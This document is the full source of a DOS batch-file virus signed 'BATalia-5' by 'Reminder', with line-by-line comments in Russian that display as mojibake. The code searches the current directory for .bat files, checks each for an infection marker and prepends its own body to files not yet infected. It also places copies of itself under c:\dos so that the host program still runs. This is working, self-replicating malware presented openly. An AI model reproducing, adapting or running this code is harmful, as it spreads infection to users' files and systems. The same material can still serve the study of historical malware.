@echo off ; �� AKA "����������� ������" �몫�祭�
rem YYY  ; ��⪠ �����
if "%1"=="5" goto s ; �᫨ �맢�� � ��ࠬ��஬ 2 � ᮡ᭮ ��ࠡ��稪
for %%b in (*.bat) do call %0 5 %%b  ; ��ॡ�� ��� ��⭨��� � ⥪�饬 ��⠫���
  ; � �᫨ ������ ��� ����, � �맮� ᥡ� �� � ��ࠬ��ࠬ� [2] � [��� ��⭨��]
goto b ; ����� ��ॡ�� -  �⤠�� �ࠢ����� ��ࠦ����� �ணࠬ��   
:s   ; ��砫� ��ࠡ��稪�
copy %2 p>l  ; ᪮��஢��� �������� ��⭨� � p
echo NNN>>p  ; �������� � ����� p ��ப� NNN
echo 1>z1    ; ᮧ���� 䠩� z1 � ��ப�� 1
echo 2>z2    ; ᮧ���� 䠩� z2 � ��ப�� 2
echo 3>z3    ; ᮧ���� 䠩� z3 � ��ப�� 3
del z?/p<p>l  ; �ந�室�� 㤠����� ᮧ������ 3 䠩���, �� �᭮�� 
 ; ���ଠ樨, ����祭��� �� ���������� ��⭨�� (� ���쭥�襬 - ��⭨��)
 ; �᫨ ��⭨� 㦥 ��ࠦ�� ���� - � �ந������ 㤠����� ��� 䠩��� -
 ; ( ��ப� YYY � ��砫� ����� ) - �᫨ � ⥫� ��⭨�� ��� �㦭�� �㪢
 ; N ��� Y - � ��ப� NNN ����������� ���� � ����� ��⭨�� �� ���� 
 ; ������� ������� DEL � �������� ������ �� ����������. 
if exist z? goto i ; �᫨ ������� ��� ���� 䠩� Z? - � ��⭨�
 ; �� ��ࠦ�� ����ᮬ � ���⮬� �������� ��ࠦ����.
goto e   ; �᫨ ���� ��⭨� 㦥 � ����ᮬ - ��୥��� � ��ॡ���.
:i    ; ��楤�� ��ࠦ����
type %0>b  ; ᪮��஢��� ���� ����� (�� ���� 0A) � 䠩� b
copy b a/a>l  ; ᪮��஢��� ���� ����� � 䠩� a � ����������� 0A � �����
copy %2 t>l   ; ᪮��஢��� ��⭨� � 䠩� t
copy /ba+t %2>l  ; ᪮��஢��� ����� � 0A + t � ��⭨� (�������� � ��砫�) 
goto e    ; �த������ ��ॡ��
:b   ; ��楤�� ��।�� �ࠢ����� ��ன (��襩) �ண�
echo rem               >x ; ������ 䠩� x � ��ப�� rem, �஡����� � ���஬  
copy x+x+x+x y>l   ; 䠩� y 㦥 �㤥� ᮤ�ঠ�� 4 rem`�, �஡��� � 4 ����
copy y+y+y+y+y+y z>l  ; 䠩� z �㤥� ᮤ�ঠ�� 24 rem`a, �஡��� � 24 ����
echo @%%comspec%% nul /ccopy c:\dos\y %%0>>z ; � ����� 䠩�� z ����������
 ; ���᫥����� ��ப� 
copy z c:\dos\x>l ; � ��� 䠩� z - ��������� � c:\dos\x
copy %0 c:\dos\y>l ; � ��� (�ᯮ��塞��) �ண� � c:\dos\y
del ??>l  ; 㤠�塞 �� �஬������ 䠩��
echo on ; �� ����祭�
@copy c:\dos\x %0>nul  ; ---------
:e                              ; |
:[BATalia-5] (c) by Reminder      ; |
  